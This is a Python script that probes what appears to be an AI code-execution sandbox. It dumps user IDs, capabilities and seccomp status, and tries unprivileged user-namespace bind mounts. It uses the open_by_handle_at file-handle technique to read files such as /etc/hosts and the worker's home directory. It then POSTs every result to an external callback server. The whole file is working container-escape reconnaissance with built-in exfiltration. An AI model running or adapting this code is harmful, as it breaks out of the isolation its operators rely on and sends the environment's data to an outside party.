#!/usr/bin/env python3
import ctypes, errno, json, os, pathlib, subprocess, tempfile, time, urllib.request
SINK='https://54.209.51.244.sslip.io/callback/snapgpt-userns-handle-probe2-20261106'
out={'schema':'snapgpt.userns-handle-probe/v2','utc':time.strftime('%Y-%m-%dT%H:%M:%SZ',time.gmtime()),'tests':{}}
def run(name, script, timeout=30):
 try:
  p=subprocess.run(['sh','-c',script],capture_output=True,text=True,timeout=timeout)
  out['tests'][name]={'rc':p.returncode,'stdout':p.stdout[-30000:],'stderr':p.stderr[-10000:]}
 except Exception as e: out['tests'][name]={'error':repr(e)}
run('identity', r'''id; grep -E '^(Uid|Gid|Cap|NoNewPrivs|Seccomp):' /proc/self/status; stat -c '%A %u:%g %n' /home/worker /tmp/workspace /tmp || true''')
run('bind_tmpfs', r'''rm -rf /tmp/nsb; mkdir -p /tmp/nsb; echo host=$(stat -c '%d:%i %A %u:%g %n' /home/worker); unshare -Ur -m --propagation private sh -c 'echo inside=$(id); cat /proc/self/uid_map; mkdir -p /tmp/nsb; mount --bind /home/worker /tmp/nsb; echo bind_rc=$?; mount -t tmpfs tmpfs /tmp/nsb2 2>&1; echo tmp_rc=$?; findmnt -T /tmp/nsb -o TARGET,SOURCE,FSTYPE,OPTIONS 2>&1; ls -ld /tmp/nsb; stat -c "%d:%i %A %u:%g %n" /tmp/nsb; touch /tmp/nsb/probe 2>&1; echo touch_rc=$?; ls -la /tmp/nsb | head' 2>&1''')
# Run the ctypes handle test in a fresh user+mount namespace via a child script.
child = r'''
import ctypes, errno, json, os, pathlib, struct, subprocess
libc=ctypes.CDLL(None,use_errno=True)
# Linux file_handle is variable; allocate enough and use ctypes structures.
class FileHandle(ctypes.Structure):
    _fields_=[('handle_bytes', ctypes.c_uint), ('handle_type', ctypes.c_int), ('f_handle', ctypes.c_ubyte*128)]
class MountAttr(ctypes.Structure):
    _fields_=[('attr_set', ctypes.c_ulonglong), ('attr_clr', ctypes.c_ulonglong), ('propagation', ctypes.c_ulonglong), ('userns_fd', ctypes.c_ulonglong)]
libc.name_to_handle_at.argtypes=[ctypes.c_int,ctypes.c_char_p,ctypes.POINTER(FileHandle),ctypes.POINTER(ctypes.c_int),ctypes.c_int]
libc.name_to_handle_at.restype=ctypes.c_int
libc.open_by_handle_at.argtypes=[ctypes.c_int,ctypes.POINTER(FileHandle),ctypes.c_int]
libc.open_by_handle_at.restype=ctypes.c_int
out={}
paths=['/home/worker','/tmp/workspace','/etc/hosts','/dev/termination-log']
for path in paths:
    h=FileHandle(); h.handle_bytes=128; mid=ctypes.c_int()
    rc=libc.name_to_handle_at(-100,path.encode(),ctypes.byref(h),ctypes.byref(mid),0)
    rec={'name_rc':rc,'name_errno':ctypes.get_errno(),'handle_bytes':h.handle_bytes,'handle_type':h.handle_type,'mount_id':mid.value}
    if rc==0:
        fd=libc.open_by_handle_at(-100,ctypes.byref(h),os.O_RDONLY)
        rec['open_fd']=fd; rec['open_errno']=ctypes.get_errno()
        if fd>=0:
            try: rec['content']=os.read(fd,256).decode('utf-8','replace')
            except Exception as e: rec['read_error']=repr(e)
            os.close(fd)
    out[path]=rec
print(json.dumps(out,sort_keys=True))
'''
# The child script is passed through base64 to avoid quoting.
import base64
b64=base64.b64encode(child.encode()).decode()
run('handle_initial', f'''python3 - <<'PY2'\n{child}\nPY2''')
run('handle_userns_bind', f'''rm -rf /tmp/nsb; mkdir -p /tmp/nsb; unshare -Ur -m --propagation private sh -c 'mkdir -p /tmp/nsb; mount --bind /home/worker /tmp/nsb; echo bind_rc=$?; python3 - <<'PY2'\n{child}\nPY2' 2>&1''')
raw=json.dumps(out,sort_keys=True,separators=(',',':')).encode()
try:
 req=urllib.request.Request(SINK,data=raw,method='POST',headers={'Content-Type':'application/json'})
 with urllib.request.urlopen(req,timeout=30) as r: out['sink']={'status':r.status,'body':r.read(1000).decode('utf-8','replace')}
except Exception as e: out['sink']={'error':repr(e)}
print(json.dumps(out,sort_keys=True,separators=(',',':')))
